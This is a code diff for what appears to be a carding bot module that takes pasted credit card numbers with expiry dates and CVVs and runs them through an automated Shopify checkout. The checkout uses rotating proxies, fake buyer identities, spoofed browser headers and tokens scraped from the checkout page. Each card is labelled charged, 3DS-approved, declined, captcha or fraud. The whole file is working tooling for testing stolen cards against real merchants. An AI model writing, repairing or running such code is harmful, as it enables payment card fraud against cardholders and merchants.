@@ -46,7 +46,6 @@ except ImportError:
     def get_bin_details(bin_number):
         return {}
 
-# Import filter.py for smart card parsing
 try:
     from BOT.helper.filter import extract_cards
     FILTER_AVAILABLE = True
@@ -55,7 +54,6 @@ except ImportError as e:
     print(f"❌ Filter module import error in shopify077: {e}")
     FILTER_AVAILABLE = False
 
-# Import proxy system functions
 try:
     from BOT.tools.proxy import (
         get_proxy_for_user,
@@ -303,28 +301,24 @@ def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, use
 
     raw_response = str(raw_response) if raw_response else "-"
     
-    # FIRST check specifically for TIMEOUT and PCI errors only
     if "TIMEOUT" in raw_response.upper() or "PCI_ERROR" in raw_response.upper():
         status_flag = "Error❗️"
         response_display = "Try again ♻️"
     else:
-        # Extract clean error message - only the error identifier before colon
+        # Determine response_display
         if "DECLINED - " in raw_response:
             response_display = raw_response.split("DECLINED - ")[-1]
-            if ":" in response_display:
-                response_display = response_display.split(":")[0].strip()
-            response_display = response_display.split('\n')[0]
+            response_display = response_display.split('\n')[0].strip()
             if len(response_display) > 30:
                 response_display = response_display[:27] + "..."
         elif "ORDER_PLACED" in raw_response.upper() or "PROCESSEDRECEIPT" in raw_response:
             response_display = "ORDER_PLACED"
         elif "APPROVED - " in raw_response:
             response_display = "APPROVED"
+        elif "CARD_DECLINED" in raw_response.upper():
+            response_display = "CARD_DECLINED"
         elif "GENERIC_ERROR" in raw_response:
-            if ":" in raw_response:
-                response_display = raw_response.split(":")[0].strip()
-            else:
-                response_display = "GENERIC_ERROR"
+            response_display = "GENERIC_ERROR"
         elif "PROXY_DEAD" in raw_response:
             response_display = "PROXY_DEAD"
         elif "NO_PROXY_AVAILABLE" in raw_response:
@@ -332,6 +326,8 @@ def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, use
         elif "CAPTCHA" in raw_response.upper():
             response_display = "CAPTCHA"
         elif "3D" in raw_response.upper() or "3DS" in raw_response.upper():
+            response_display = "3D_SECURE"
+        elif "ACTIONREQUIREDRECEIPT" in raw_response.upper():
             response_display = "3D_SECURE"
         elif "INSUFFICIENT" in raw_response.upper():
             response_display = "INSUFFICIENT_FUNDS"
@@ -341,91 +337,75 @@ def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, use
             response_display = "EXPIRED_CARD"
         elif "FRAUD" in raw_response.upper():
             response_display = "FRAUD"
-        elif "TAX_NEW_TAX_MUST_BE_ACCEPTED" in raw_response:
-            response_display = "TAX_CHANGE"
-        elif "PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT" in raw_response:
-            response_display = "PAYMENT_AMOUNT_ERROR"
         elif "PROCESSING_TIMEOUT" in raw_response:
             response_display = "PROCESSING_TIMEOUT"
         else:
-            if ":" in raw_response:
-                response_display = raw_response.split(":")[0].strip()
-                if len(response_display) > 30:
-                    response_display = response_display[:27] + "..."
-            else:
-                response_display = raw_response[:30] + "..." if len(raw_response) > 30 else raw_response
+            response_display = raw_response[:30] + "..." if len(raw_response) > 30 else raw_response
 
         raw_response_upper = raw_response.upper()
 
-        # Check for NO RECEIPT ID first (before success checks)
-        if "NO RECEIPT ID" in raw_response_upper:
-            status_flag = "Declined ❌"
-        # Check for SUCCESS indicators
-        elif any(keyword in raw_response_upper for keyword in [
-            "ORDER_PLACED", "SUBMITSUCCESS", "SUCCESSFUL", "APPROVED", "RECEIPT",
-            "COMPLETED", "PAYMENT_SUCCESS", "CHARGE_SUCCESS", "THANK_YOU",
-            "ORDER_CONFIRMATION", "YOUR_ORDER_IS_CONFIRMED", "ORDER_CONFIRMED",
-            "SHOPIFY_PAYMENTS", "SHOP_PAY", "CHARGED", "LIVE", "ORDER_CONFIRMED",
-            "ORDER #", "PROCESSEDRECEIPT", "THANK YOU", "PAYMENT_SUCCESSFUL",
-            "PROCESSINGRECEIPT", "AUTHORIZED", "YOUR ORDER IS CONFIRMED"
-        ]):
-            status_flag = "Charged ✅"
-        # Check for CAPTCHA
-        elif any(keyword in raw_response_upper for keyword in [
-            "CAPTCHA", "SOLVE THE CAPTCHA", "CAPTCHA_METADATA_MISSING", 
-            "CAPTCHA DETECTED", "CAPTCHA_REQUIRED", "CAPTCHA_VALIDATION_FAILED", 
-            "CAPTCHA_ERROR", "BOT_DETECTED", "HUMAN_VERIFICATION", "SECURITY_CHECK",
-            "HCAPTCHA", "CLOUDFLARE", "ENTER PAYMENT INFORMATION AND SOLVE",
-            "RECAPTCHA", "I'M NOT A ROBOT", "PLEASE VERIFY"
-        ]):
-            status_flag = "Captcha ⚠️"
-        # Check for PAYMENT ERROR
-        elif any(keyword in raw_response_upper for keyword in [
-            "THERE WAS AN ISSUE PROCESSING YOUR PAYMENT", "PAYMENT ISSUE",
-            "ISSUE PROCESSING", "PAYMENT ERROR", "PAYMENT PROBLEM",
-            "TRY AGAIN OR USE A DIFFERENT PAYMENT METHOD", "CARD WAS DECLINED",
-            "YOUR PAYMENT COULDN'T BE PROCESSED", "PAYMENT FAILED"
-        ]):
-            status_flag = "Declined ❌"
-        # Check for INSUFFICIENT FUNDS
-        elif any(keyword in raw_response_upper for keyword in [
-            "INSUFFICIENT FUNDS", "INSUFFICIENT_FUNDS", "FUNDS", "NOT ENOUGH MONEY"
-        ]):
-            status_flag = "Declined ❌"
-        # Check for INVALID CARD
-        elif any(keyword in raw_response_upper for keyword in [
-            "INVALID CARD", "CARD IS INVALID", "CARD_INVALID", "CARD NUMBER IS INVALID"
-        ]):
-            status_flag = "Declined ❌"
-        # Check for EXPIRED CARD
-        elif any(keyword in raw_response_upper for keyword in [
-            "EXPIRED", "CARD HAS EXPIRED", "CARD_EXPIRED", "EXPIRATION DATE"
-        ]):
-            status_flag = "Declined ❌"
-        # Check for 3D Secure
-        elif any(keyword in raw_response_upper for keyword in [
-            "3D", "AUTHENTICATION", "OTP", "VERIFICATION", "CVV-MATCH-OTP", 
-            "3DS", "PENDING", "SECURE REQUIRED", "SECURE_CODE", "AUTH_REQUIRED",
-            "3DS REQUIRED", "AUTHENTICATION_FAILED", "COMPLETEPAYMENTCHALLENGE",
-            "ACTIONREQUIREDRECEIPT", "ADDITIONAL_VERIFICATION_NEEDED",
-            "VERIFICATION_REQUIRED", "CARD_VERIFICATION", "AUTHENTICATE"
+        # Check 3DS / ACTION REQUIRED first
+        if any(keyword in raw_response_upper for keyword in [
+            "3D", "AUTHENTICATION", "OTP", "VERIFICATION", 
+            "3DS", "SECURE REQUIRED", "SECURE_CODE",
+            "3DS REQUIRED", "ACTIONREQUIREDRECEIPT",
+            "ADDITIONAL_VERIFICATION_NEEDED",
+            "VERIFICATION_REQUIRED", "CARD_VERIFICATION", "AUTHENTICATE",
+            "COMPLETEPAYMENTCHALLENGE"
         ]):
             status_flag = "Approved ❎"
-        # Check for CVV errors
+        # Check CAPTCHA
         elif any(keyword in raw_response_upper for keyword in [
-            "INVALID CVC", "INCORRECT CVC", "CVC_INVALID", "CVV", "SECURITY CODE"
+            "CAPTCHA", "BOT_DETECTED", "HUMAN_VERIFICATION", "SECURITY_CHECK",
+            "HCAPTCHA", "CLOUDFLARE", "RECAPTCHA"
+        ]):
+            status_flag = "Captcha ⚠️"
+        # Check success/charged
+        elif any(keyword in raw_response_upper for keyword in [
+            "ORDER_PLACED", "SUBMITSUCCESS", "SUCCESSFUL", "APPROVED",
+            "COMPLETED", "PAYMENT_SUCCESS", "CHARGE_SUCCESS", "THANK_YOU",
+            "ORDER_CONFIRMED", "CHARGED", "LIVE",
+            "ORDER #", "PROCESSEDRECEIPT", "PAYMENT_SUCCESSFUL",
+            "PROCESSINGRECEIPT", "AUTHORIZED"
+        ]):
+            status_flag = "Charged ✅"
+        # Check payment errors
+        elif "CARD_DECLINED" in raw_response_upper:
+            status_flag = "Declined ❌"
+        elif "NO RECEIPT ID" in raw_response_upper:
+            status_flag = "Declined ❌"
+        elif any(keyword in raw_response_upper for keyword in [
+            "THERE WAS AN ISSUE PROCESSING YOUR PAYMENT",
+            "CARD WAS DECLINED", "PAYMENT FAILED"
         ]):
             status_flag = "Declined ❌"
-        # Check for fraud
+        # Check insufficient funds
         elif any(keyword in raw_response_upper for keyword in [
-            "FRAUD", "FRAUD_SUSPECTED", "SUSPECTED_FRAUD", "FRAUDULENT",
-            "RISKY", "HIGH_RISK", "SECURITY_VIOLATION", "SUSPICIOUS"
+            "INSUFFICIENT FUNDS", "INSUFFICIENT_FUNDS"
+        ]):
+            status_flag = "Declined ❌"
+        # Check invalid/expired
+        elif any(keyword in raw_response_upper for keyword in [
+            "INVALID CARD", "CARD_INVALID", "CARD NUMBER IS INVALID"
+        ]):
+            status_flag = "Declined ❌"
+        elif any(keyword in raw_response_upper for keyword in [
+            "EXPIRED", "CARD HAS EXPIRED", "CARD_EXPIRED"
+        ]):
+            status_flag = "Declined ❌"
+        elif any(keyword in raw_response_upper for keyword in [
+            "INVALID CVC", "INCORRECT CVC", "CVC_INVALID", "CVV"
+        ]):
+            status_flag = "Declined ❌"
+        # Check fraud
+        elif any(keyword in raw_response_upper for keyword in [
+            "FRAUD", "FRAUD_SUSPECTED", "SUSPECTED_FRAUD",
+            "HIGH_RISK", "SECURITY_VIOLATION", "SUSPICIOUS"
         ]):
             status_flag = "Fraud ⚠️"
-        # Check for proxy errors
+        # Check proxy errors
         elif "NO_PROXY_AVAILABLE" in raw_response_upper or "PROXY_DEAD" in raw_response_upper:
             status_flag = "Proxy Error 🚫"
-        # Default to declined
         else:
             status_flag = "Declined ❌"
 
@@ -480,36 +460,6 @@ def strip_all_unicode(text):
     ascii_text = normalized.encode('ASCII', 'ignore').decode('ASCII')
     return ascii_text
 
-
-def extract_cc_from_ascii(text):
-    digit_sequences = re.findall(r'\d+', text)
-    if len(digit_sequences) < 4:
-        return None, None, None, None
-    for i in range(len(digit_sequences) - 3):
-        potential_cc = digit_sequences[i]
-        potential_month = digit_sequences[i+1]
-        potential_year = digit_sequences[i+2]
-        potential_cvv = digit_sequences[i+3]
-        if not (13 <= len(potential_cc) <= 19):
-            continue
-        try:
-            month_val = int(potential_month)
-            if not (1 <= month_val <= 12):
-                continue
-        except:
-            continue
-        if not (len(potential_year) in [2, 4]):
-            continue
-        if not (len(potential_cvv) in [3, 4]):
-            continue
-        cc = potential_cc
-        mm = potential_month.zfill(2)
-        yy = potential_year[-2:] if len(potential_year) == 4 else potential_year
-        cvv = potential_cvv
-        return cc, mm, yy, cvv
-    return None, None, None, None
-
-
 def intelligent_card_parse(text):
     try:
         if FILTER_AVAILABLE:
@@ -553,29 +503,25 @@ def intelligent_card_parse(text):
             if len(yy) == 4:
                 yy = yy[-2:]
             return cc, mm, yy, cvv
-        common_pattern = r'(\d{13,19})\s+(\d{1,2})[/\-](\d{2,4})\s+(\d{3,4})'
-        common_match = re.search(common_pattern, ascii_text)
-        if common_match:
-            cc = common_match.group(1)
-            mm = common_match.group(2).zfill(2)
-            yy = common_match.group(3)
-            cvv = common_match.group(4)
-            if len(yy) == 4:
-                yy = yy[-2:]
-            return cc, mm, yy, cvv
-        cc, mm, yy, cvv = extract_cc_from_ascii(ascii_text)
-        if cc:
-            return cc, mm, yy, cvv
-    except Exception as e:
-        print(f"Card parsing error: {e}")
+        digits = re.findall(r'\d+', ascii_text)
+        for i in range(len(digits) - 3):
+            if (13 <= len(digits[i]) <= 19 and len(digits[i+1]) in [1,2] and 
+                len(digits[i+2]) in [2,4] and len(digits[i+3]) in [3,4]):
+                cc = digits[i]
+                mm = digits[i+1].zfill(2)
+                yy = digits[i+2][-2:]
+                cvv = digits[i+3]
+                if 1 <= int(mm) <= 12:
+                    return cc, mm, yy, cvv
+    except:
+        pass
     return None, None, None, None
-
 
 def parse_card_input(card_input):
     return intelligent_card_parse(card_input)
 
 
-# ========== SHOPIFY MIDDLE EASTERN CHECKOUT CLASS (FIXED V3) ==========
+# ========== SHOPIFY MIDDLE EASTERN CHECKOUT CLASS ==========
 class ShopifyMiddleEasternCheckout:
     def __init__(self, user_id=None):
         self.user_id = user_id
@@ -589,29 +535,26 @@ class ShopifyMiddleEasternCheckout:
         self.proxy_used = False
 
         self.client = None
+        self.pci_client = None
 
         self.ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36'
         self.sec_ch_ua = '"Google Chrome";v="147", "Not.A/Brand";v="8", "Chromium";v="147"'
 
         self.checkout_token = None
         self.session_token = None
-        self.graphql_session_token = None
         self.receipt_id = None
         self.stable_id = None
         self.queue_token = None
         self.shop_id = "7899283507"
-        self.cart_token = None
         self.signature = None
+        self.pci_build_hash = "a8e4a94"
         
-        # Cookie storage
+        self.delivery_strategy_handle = None
+        self.payment_method_identifier = None
+        self.signed_handles = []
+        self._r_param = None
+        
         self.cookies = {}
-
-        self.proposal_id = "e65ffeb18d0b5e7cc746231c07befb63f4bc2e69c060d4067ca9115a923ae427"
-        self.submit_id = "7cc51969cc21c5f45bc518e0650abe94c2ff3ffa378fb7d0b72212b44ff36470"
-        self.poll_id = "42b5051ef09da17cd5cb5789121ab3adab0ca8c9ec7547a4d431bb17060e757f"
-        
-        self.delivery_strategy_handle = "ac9e7f3aa427ceb472f68152b58f9b9d-d1034e3625f52df7167f7147c44cdf16"
-        self.payment_method_identifier = "52f25659ce34a87c642a51c00887c2e2"
 
         self.logger = ShopifyLogger(user_id)
 
@@ -619,19 +562,18 @@ class ShopifyMiddleEasternCheckout:
                            "Joseph", "Thomas", "Charles", "Daniel", "Matthew", "Anthony", "Mark", 
                            "Donald", "Steven", "Paul", "Andrew", "Kenneth", "Joshua", "Kevin", 
                            "Brian", "George", "Timothy", "Ronald", "Edward", "Jason", "Jeffrey",
-                           "Casey", "Mini", "Bruce", "Tony", "Steve", "Peter", "Clark", "Randua",
-                           "Ashley", "Jessica", "Sarah", "Emily", "Lisa", "Michelle", "Mallika"]
+                           "Casey", "Mini", "Bruce", "Tony", "Steve", "Peter", "Clark"]
         self.last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", 
                           "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", 
                           "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin", 
                           "Lee", "Perez", "Thompson", "White", "Harris", "Sanchez", "Clark", "Lang", 
-                          "Trump", "Walker", "Hall", "Allen", "Young", "King", "Baby"]
+                          "Trump", "Walker", "Hall", "Allen", "Young", "King"]
 
         self.first_name = random.choice(self.first_names)
         self.last_name = random.choice(self.last_names)
         self.full_name = f"{self.first_name} {self.last_name}"
         self.email = f"{self.first_name.lower()}{self.last_name.lower()}{random.randint(10,999)}@gmail.com"
-        self.phone = f"515{random.randint(100, 999)}{random.randint(1000, 9999)}"
+        self.phone = "5152744692"
 
         self.address = {
             "address1": "3950 N Harlem Ave",
@@ -702,6 +644,12 @@ class ShopifyMiddleEasternCheckout:
             pass
         return None
     
+    def extract_r_param(self, url):
+        match = re.search(r'_r=([^&]+)', url)
+        if match:
+            return match.group(1)
+        return None
+    
     def generate_random_string(self, length=16):
         return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
 
@@ -711,9 +659,97 @@ class ShopifyMiddleEasternCheckout:
     def generate_timestamp(self):
         return str(int(time.time() * 1000))
 
-    # ========== STEP 0: Initialize Session ==========
-    async def initialize_session(self):
-        self.step(0, "INITIALIZE SESSION", "Visiting store to get cookies")
+    # Extraction helpers from HTML
+    def extract_session_token(self, html):
+        m = re.search(r'name="serialized-sessionToken"\s+content="&quot;([^"]+)&quot;"', html)
+        if m:
+            self.session_token = m.group(1)
+            return self.session_token
+        pats = [
+            r'"sessionToken"\s*:\s*"(AAEB[^"]+)"',
+            r'(AAEB[A-Za-z0-9_\-]{50,})',
+        ]
+        for pat in pats:
+            m = re.search(pat, html)
+            if m:
+                self.session_token = m.group(1)
+                return self.session_token
+        return None
+
+    def extract_stable_id(self, html):
+        pats = [
+            r'"stableId"\s*:\s*"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"',
+            r'stableId[\s:=]+["\'"]([0-9a-f-]{36})',
+        ]
+        for pat in pats:
+            m = re.search(pat, html)
+            if m:
+                self.stable_id = m.group(1)
+                return self.stable_id
+        self.stable_id = str(self.generate_uuid())
+        return self.stable_id
+
+    def extract_queue_token(self, html):
+        m = re.search(r'queueToken&quot;:&quot;([^&]+)&quot;', html)
+        if not m:
+            m = re.search(r'"queueToken"\s*:\s*"([^"]+)"', html)
+        if m:
+            self.queue_token = m.group(1)
+            return self.queue_token
+        return None
+
+    def extract_signature(self, html):
+        pats = [
+            r'"shopifyPaymentRequestIdentificationSignature"\s*:\s*"(eyJ[^"]+)"',
+            r'"identificationSignature"\s*:\s*"(eyJ[^"]+)"',
+            r'(eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+)',
+        ]
+        for pat in pats:
+            m = re.search(pat, html)
+            if m:
+                self.signature = m.group(1)
+                return self.signature
+        return None
+
+    def extract_payment_identifier(self, html):
+        m = re.search(r'paymentMethodIdentifier&quot;:&quot;([^&]+)&quot;', html)
+        if not m:
+            m = re.search(r'"paymentMethodIdentifier"\s*:\s*"([^"]+)"', html)
+        if m:
+            self.payment_method_identifier = m.group(1)
+            return self.payment_method_identifier
+        return None
+
+    def extract_delivery_strategy(self, html):
+        pats = [
+            r'"handle"\s*:\s*"([a-f0-9]{32}-[a-f0-9]{32})"',
+            r'handle[\s:=]+["\'"]([a-f0-9]{32}-[a-f0-9]{32})',
+        ]
+        for pat in pats:
+            matches = re.findall(pat, html)
+            if matches:
+                self.delivery_strategy_handle = matches[0]
+                return self.delivery_strategy_handle
+        return None
+
+    def extract_signed_handles(self, html):
+        handles = re.findall(r'"signedHandle"\s*:\s*"([^"]+)"', html)
+        if not handles:
+            raw = re.findall(r'\\"signedHandle\\":\\"([^\\"]+)', html)
+            handles = [h.replace('\\n','').replace('\\r','') for h in raw]
+        self.signed_handles = handles
+        return handles
+
+    def extract_pci_build_hash(self, html):
+        m = re.search(r'checkout\.pci\.shopifyinc\.com/build/([a-f0-9]+)/', html)
+        if m:
+            self.pci_build_hash = m.group(1)
+        return self.pci_build_hash
+
+    # ========== STEPS ==========
+
+    async def visit_homepage(self):
+        self.step(1, "VISIT HOMEPAGE", "Getting initial cookies")
         headers = {
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
             'accept-language': 'en-US,en;q=0.9',
@@ -730,26 +766,25 @@ class ShopifyMiddleEasternCheckout:
             'user-agent': self.ua,
         }
         try:
-            resp = await self.client.get(self.base_url, headers=headers, timeout=25, follow_redirects=True)
+            resp = await self.client.get(self.base_url + "/", headers=headers, timeout=30)
             self._update_cookies(resp)
             if resp.status_code == 200:
-                return True, "SESSION_INITIALIZED"
-            return False, f"Session init failed: {resp.status_code}"
+                self.extract_pci_build_hash(resp.text)
+                return True, "HOMEPAGE_OK"
+            return False, "Homepage failed: {}".format(resp.status_code)
         except httpx.ProxyError:
             self.proxy_status = "Dead 🚫"
             return False, "PROXY_DEAD"
-        except httpx.TimeoutException:
-            return False, "TIMEOUT"
         except Exception as e:
-            return False, f"Session init error: {str(e)[:50]}"
+            return False, "Homepage error: {}".format(str(e)[:50])
 
-    # ========== STEP 1: Visit Product Page ==========
     async def visit_product_page(self):
-        self.step(1, "VISIT PRODUCT", f"Visiting: {self.base_url}/products/{self.product_handle}")
+        self.step(2, "VISIT PRODUCT", "Visiting product page")
         headers = {
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
             'accept-language': 'en-US,en;q=0.9',
             'priority': 'u=0, i',
+            'referer': self.base_url,
             'sec-ch-ua': self.sec_ch_ua,
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"Windows"',
@@ -759,34 +794,50 @@ class ShopifyMiddleEasternCheckout:
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'user-agent': self.ua,
-            'referer': self.base_url,
         }
         try:
             resp = await self.client.get(
                 f"{self.base_url}/products/{self.product_handle}",
-                headers=headers, timeout=25, follow_redirects=True
+                headers=headers, timeout=30, follow_redirects=True
             )
             self._update_cookies(resp)
             if resp.status_code == 200:
-                return True, "PRODUCT_VISITED"
-            return False, f"Product page failed: {resp.status_code}"
-        except httpx.ProxyError:
-            self.proxy_status = "Dead 🚫"
-            return False, "PROXY_DEAD"
-        except httpx.TimeoutException:
-            return False, "TIMEOUT"
+                return True, "PRODUCT_OK"
+            return False, "Product page failed: {}".format(resp.status_code)
         except Exception as e:
-            return False, f"Product page error: {str(e)[:50]}"
+            return False, "Product error: {}".format(str(e)[:50])
 
-    # ========== STEP 2: Add to Cart (FIXED - using URL-encoded form data) ==========
     async def add_to_cart(self):
-        self.step(2, "ADD TO CART", f"Adding variant {self.variant_id} to cart")
+        self.step(3, "ADD TO CART", f"Adding variant {self.variant_id}")
         
-        # Use URL-encoded form data (matching captured traffic)
+        boundary = "----WebKitFormBoundary" + self.generate_random_string(16)
+        
+        fields = [
+            ("quantity", "1"),
+            ("form_type", "product"),
+            ("utf8", "\xe2\x9c\x93"),
+            ("id", self.variant_id),
+            ("product-id", self.product_id),
+            ("section-id", "template--14796746227799__main"),
+            ("sections", "cart-drawer,cart-icon-bubble"),
+            ("sections_url", f"/products/{self.product_handle}"),
+        ]
+        
+        body_parts = []
+        for name, value in fields:
+            body_parts.append(f"--{boundary}")
+            body_parts.append(f'Content-Disposition: form-data; name="{name}"')
+            body_parts.append("")
+            body_parts.append(value)
+        body_parts.append(f"--{boundary}--")
+        body_parts.append("")
+        
+        body = "\r\n".join(body_parts)
+        
         headers = {
             'accept': 'application/javascript',
             'accept-language': 'en-US,en;q=0.9',
-            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'content-type': f'multipart/form-data; boundary={boundary}',
             'origin': self.base_url,
             'priority': 'u=1, i',
             'referer': f'{self.base_url}/products/{self.product_handle}',
@@ -800,85 +851,26 @@ class ShopifyMiddleEasternCheckout:
             'x-requested-with': 'XMLHttpRequest',
         }
         
-        # URL-encoded form data (exactly matching captured traffic)
-        form_data = {
-            'quantity': '1',
-            'form_type': 'product',
-            'utf8': '✓',
-            'id': self.variant_id,
-            'product-id': self.product_id,
-            'section-id': 'template--14796746227799__main',
-            'sections': 'cart-drawer,cart-icon-bubble',
-            'sections_url': f'/products/{self.product_handle}',
-        }
-        
         try:
             resp = await self.client.post(
                 f"{self.base_url}/cart/add",
                 headers=headers,
-                data=form_data,
-                timeout=25,
-                follow_redirects=True
+                content=body.encode('utf-8'),
+                timeout=30
             )
             self._update_cookies(resp)
-            
             if resp.status_code == 200:
-                try:
-                    cart_data = resp.json()
-                    self.cart_token = cart_data.get('cart_token', self.cart_token)
-                except:
-                    pass
-                self.logger.data_extracted("Cart Token", self.cart_token or "None", "Add to Cart")
-                return True, "ADDED_TO_CART"
-            return False, f"Add to cart failed: {resp.status_code}"
-        except httpx.ProxyError:
-            self.proxy_status = "Dead 🚫"
-            return False, "PROXY_DEAD"
-        except httpx.TimeoutException:
-            return False, "TIMEOUT"
+                self.logger.data_extracted("Cart", "Added", "Cart Add")
+                return True, "CART_OK"
+            return False, "Cart add failed: {}".format(resp.status_code)
         except Exception as e:
-            return False, f"Add to cart error: {str(e)[:50]}"
+            return False, "Cart add error: {}".format(str(e)[:50])
 
-    # ========== STEP 2.5: Get Product Section (CRITICAL - missing step!) ==========
-    async def get_product_section(self):
-        self.step(2.5, "GET PRODUCT SECTION", "Fetching product section after add to cart")
-        headers = {
-            'accept': '*/*',
-            'accept-language': 'en-US,en;q=0.9',
-            'priority': 'u=1, i',
-            'sec-ch-ua': self.sec_ch_ua,
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-origin',
-            'user-agent': self.ua,
-            'referer': f'{self.base_url}/products/{self.product_handle}',
-        }
+    async def go_to_checkout(self):
+        self.step(4, "GO TO CHECKOUT", "POST /cart to get redirect")
         
-        params = {
-            'variant': self.variant_id,
-            'section_id': 'template--14796746227799__main',
-        }
-        
-        try:
-            resp = await self.client.get(
-                f"{self.base_url}/products/{self.product_handle}",
-                headers=headers,
-                params=params,
-                timeout=25,
-                follow_redirects=True
-            )
-            self._update_cookies(resp)
-            return True, "SECTION_LOADED"
-        except Exception:
-            return True, "SECTION_SKIPPED"  # Non-critical
-
-    # ========== STEP 3: Start Checkout (POST /cart) ==========
-    async def start_checkout(self):
-        self.step(3, "START CHECKOUT", "POST /cart to initiate checkout redirect")
         headers = {
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
             'accept-language': 'en-US,en;q=0.9',
             'cache-control': 'max-age=0',
             'content-type': 'application/x-www-form-urlencoded',
@@ -896,45 +888,39 @@ class ShopifyMiddleEasternCheckout:
             'user-agent': self.ua,
         }
         
-        data = 'updates%5B%5D=1&checkout='
-        
         try:
             resp = await self.client.post(
                 f"{self.base_url}/cart",
                 headers=headers,
-                content=data,
-                timeout=25,
-                follow_redirects=True
+                content="updates%5B%5D=1&checkout=",
+                timeout=30,
+                follow_redirects=False
             )
-            self._update_cookies(resp)
             
-            current_url = str(resp.url)
-            self.checkout_token = self.extract_checkout_token(current_url)
-            
-            if self.checkout_token:
-                self.logger.data_extracted("Checkout Token", self.checkout_token, "Checkout Redirect URL")
-                self.graphql_session_token = f"{self.checkout_token}-{self.generate_timestamp()}"
-                self.logger.data_extracted("GraphQL Session Token", self.graphql_session_token, "Constructed")
-                return True, current_url
-            else:
-                self.logger.error_log("CHECKOUT_TOKEN", "No token found")
-                return False, "CHECKOUT_TOKEN_ERROR"
-        except httpx.ProxyError:
-            self.proxy_status = "Dead 🚫"
-            return False, "PROXY_DEAD"
-        except httpx.TimeoutException:
-            return False, "TIMEOUT"
+            if resp.status_code in [302, 301, 303, 307, 308]:
+                location = resp.headers.get('location', '')
+                self.checkout_token = self.extract_checkout_token(location)
+                self._r_param = self.extract_r_param(location)
+                
+                if self.checkout_token:
+                    self.logger.data_extracted("Checkout Token", self.checkout_token[:15] + "...", "Cart redirect")
+                    return True, location
+                return False, "No checkout token in redirect"
+            return False, "Cart POST failed: {}".format(resp.status_code)
         except Exception as e:
-            return False, f"Checkout start error: {str(e)[:50]}"
+            return False, "Cart POST error: {}".format(str(e)[:50])
 
-    # ========== STEP 4: Get Checkout Page & Extract Tokens ==========
     async def get_checkout_page(self):
-        self.step(4, "GET CHECKOUT PAGE", "Loading checkout page and extracting tokens")
+        self.step(5, "GET CHECKOUT PAGE", "Loading checkout page and extracting tokens")
         
-        checkout_url = f"{self.base_url}/checkouts/cn/{self.checkout_token}/en-us?_r={self.generate_random_string(20)}&auto_redirect=false&edge_redirect=true&skip_shop_pay=true"
+        checkout_url = f"{self.base_url}/checkouts/cn/{self.checkout_token}/en-us"
+        if self._r_param:
+            checkout_url += f"?_r={self._r_param}&auto_redirect=false&edge_redirect=true&skip_shop_pay=true"
+        else:
+            checkout_url += "?auto_redirect=false&edge_redirect=true&skip_shop_pay=true"
         
         headers = {
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
             'accept-language': 'en-US,en;q=0.9',
             'cache-control': 'max-age=0',
             'priority': 'u=0, i',
@@ -951,245 +937,42 @@ class ShopifyMiddleEasternCheckout:
         }
         
         try:
-            resp = await self.client.get(checkout_url, headers=headers, timeout=25, follow_redirects=True)
+            resp = await self.client.get(checkout_url, headers=headers, timeout=30, follow_redirects=True)
             self._update_cookies(resp)
             
             if resp.status_code != 200:
-                return False, f"Checkout page failed: {resp.status_code}"
+                return False, "Checkout page failed: {}".format(resp.status_code)
             
             html = resp.text
             
-            # Extract session token
-            session_patterns = [
-                r'"sessionToken"\s*:\s*"(AAEB[^"]+)"',
-                r'(AAEB[A-Za-z0-9_\-]{50,})',
-            ]
-            for pat in session_patterns:
-                m = re.search(pat, html)
-                if m:
-                    self.session_token = m.group(1)
-                    break
+            self.extract_session_token(html)
+            self.extract_stable_id(html)
+            self.extract_queue_token(html)
+            self.extract_signature(html)
+            self.extract_payment_identifier(html)
+            self.extract_delivery_strategy(html)
+            self.extract_signed_handles(html)
+            self.extract_pci_build_hash(html)
+            
+            self.logger.data_extracted("Session Token", (self.session_token or "N/A")[:25] + "...", "Checkout")
+            self.logger.data_extracted("Stable ID", (self.stable_id or "N/A")[:20] + "...", "Checkout")
+            self.logger.data_extracted("Queue Token", (self.queue_token or "N/A")[:20] + "...", "Checkout")
+            self.logger.data_extracted("Signature", "FOUND" if self.signature else "NOT FOUND", "Checkout")
+            self.logger.data_extracted("Payment ID", (self.payment_method_identifier or "N/A")[:20] + "...", "Checkout")
+            self.logger.data_extracted("Delivery Handle", (self.delivery_strategy_handle or "N/A")[:20] + "...", "Checkout")
             
             if not self.session_token:
-                self.logger.error_log("SESSION_TOKEN", "Could not extract session token")
-                return False, "SESSION_TOKEN_ERROR"
-            
-            self.logger.data_extracted("Session Token", self.session_token[:30] + "...", "Checkout HTML")
-            
-            # Extract signature
-            sig_patterns = [
